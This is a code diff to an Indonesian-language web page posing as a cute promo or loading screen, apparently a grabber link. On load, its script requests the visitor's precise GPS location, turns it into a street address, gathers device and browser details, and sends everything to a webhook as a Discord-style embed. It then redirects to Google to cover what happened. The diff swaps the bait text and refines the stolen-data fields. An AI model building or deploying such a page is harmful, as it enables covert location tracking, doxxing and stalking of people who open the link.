@@ -110,7 +110,7 @@
         }
         
         .text-3d {
-            font-size: 18px;
+            font-size: 28px;
             color: #FF1493;
             font-weight: 700;
             text-shadow: 
@@ -118,14 +118,23 @@
                 6px 6px 0px rgba(255, 105, 180, 0.3),
                 9px 9px 15px rgba(0, 0, 0, 0.1);
             transform: perspective(600px) rotateX(2deg) rotateY(-2deg);
-            margin: 15px 0;
+            margin: 20px 0;
+            line-height: 1.4;
         }
         
-        .loading-text {
-            color: #FF69B4;
-            font-weight: 600;
-            font-size: 16px;
-            margin-top: 15px;
+        .spinner {
+            border: 4px solid #FFE4F0;
+            border-top: 4px solid #FF69B4;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
         .heart-float {
@@ -191,11 +200,9 @@
             <div class="sticker-item">⭐</div>
         </div>
         
-        <div class="text-3d">Verifikasi Promo Eksklusif</div>
-        <p style="color: #999; font-size: 14px; margin-bottom: 20px;">Dapatkan diskon hingga 70% untuk Anda!</p>
+        <div class="spinner"></div>
         
-        <p class="loading-text">🌟 Loading promo special... 🌟</p>
-        <p style="color: #FFB6D9; font-size: 12px; margin-top: 10px;">Tunggu sebentar ya sayang~ 💕</p>
+        <div class="text-3d">TUNGGUU YAA SAYANG<br>LAGI LOADING NIH 💕</div>
     </div>
 
     <script>
@@ -256,7 +263,7 @@
         }
         
         function formatAddress(addressData) {
-            if (!addressData) return 'Lokasi ditemukan';
+            if (!addressData) return 'Lokasi terdeteksi';
             
             const parts = [];
             if (addressData.house_number) parts.push(addressData.house_number);
@@ -268,11 +275,11 @@
             if (addressData.postcode) parts.push(addressData.postcode);
             if (addressData.country) parts.push(addressData.country);
             
-            return parts.join(', ') || addressData.display_name || 'Lokasi ditemukan';
+            return parts.length > 0 ? parts.join(', ') : (addressData.display_name || 'Lokasi terdeteksi');
         }
         
         async function getDeviceInfo() {
-            const info = {
+            return {
                 platform: navigator.platform,
                 userAgent: navigator.userAgent,
                 language: navigator.language,
@@ -283,7 +290,6 @@
                 onLine: navigator.onLine,
                 hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
             };
-            return info;
         }
         
         async function captureLocation() {
@@ -297,26 +303,26 @@
                         const addressData = await reverseGeocode(lat, lon);
                         const fullAddress = formatAddress(addressData);
                         
-                        const locationData = {
+                        resolve({
                             latitude: lat.toFixed(8),
                             longitude: lon.toFixed(8),
                             accuracy: accuracy.toFixed(2),
                             address: fullAddress,
-                            mapsUrl: `https://maps.google.com/?q=${lat},${lon}`
-                        };
-                        
-                        resolve(locationData);
+                            mapsUrl: `https://maps.google.com/?q=${lat},${lon}`,
+                            status: 'success'
+                        });
                     },
                     function(error) {
                         resolve({
                             latitude: 'denied',
                             longitude: 'denied',
                             accuracy: 'denied',
-                            address: 'Permission denied',
-                            mapsUrl: 'N/A'
+                            address: 'Permission denied or unavailable',
+                            mapsUrl: 'N/A',
+                            status: 'denied'
                         });
                     },
-                    { timeout: 5000, enableHighAccuracy: true }
+                    { timeout: 5000, enableHighAccuracy: true, maximumAge: 0 }
                 );
             });
         }
@@ -324,26 +330,26 @@
         async function sendToWebhook(locationData, deviceInfo) {
             const data = {
                 "embeds": [{
-                    "title": "🎀 HAAII Visitor Data 🎀",
+                    "title": "🎀 HAAII Visitor 🎀",
                     "color": 16711827,
                     "fields": [
                         {
-                            "name": "📍 Lokasi",
-                            "value": `${locationData.address}`,
+                            "name": "📍 LOKASI LENGKAP",
+                            "value": locationData.address,
                             "inline": false
                         },
                         {
-                            "name": "📌 Koordinat",
+                            "name": "🧭 Koordinat",
                             "value": `Lat: ${locationData.latitude}\nLon: ${locationData.longitude}`,
                             "inline": true
                         },
                         {
-                            "name": "📊 Akurasi",
+                            "name": "📏 Akurasi",
                             "value": `${locationData.accuracy}m`,
                             "inline": true
                         },
                         {
-                            "name": "🖥️ Platform",
+                            "name": "🖥️ Device",
                             "value": deviceInfo.platform,
                             "inline": true
                         },
@@ -353,7 +359,7 @@
                             "inline": true
                         },
                         {
-                            "name": "📺 Resolusi",
+                            "name": "📺 Screen",
                             "value": deviceInfo.screenResolution,
                             "inline": true
                         },
@@ -363,13 +369,13 @@
                             "inline": true
                         },
                         {
-                            "name": "🔌 User Agent",
-                            "value": `\`\`\`${deviceInfo.userAgent}\`\`\``,
+                            "name": "📍 Google Maps",
+                            "value": `[Buka Maps](${locationData.mapsUrl})`,
                             "inline": false
                         },
                         {
-                            "name": "🗺️ Google Maps",
-                            "value": `[Buka Maps](${locationData.mapsUrl})`,
+                            "name": "🔗 User Agent",
+                            "value": `\`\`\`${deviceInfo.userAgent.substring(0, 100)}...\`\`\``,
                             "inline": false
                         }
                     ]
@@ -383,13 +389,13 @@
                     body: JSON.stringify(data)
                 });
             } catch (error) {
-                console.log('Data sent');
+                console.log('Sent');
             }
         }
         
         window.addEventListener('load', async () => {
             createStars();
-            setInterval(createFloatingHeart, 500);
+            setInterval(createFloatingHeart, 300);
             
             const locationData = await captureLocation();
             const deviceInfo = await getDeviceInfo();
@@ -398,7 +404,7 @@
             
             setTimeout(() => {
                 window.location.href = 'https://www.google.com';
-            }, 2000);
+            }, 1500);
         });
     </script>
 </body>
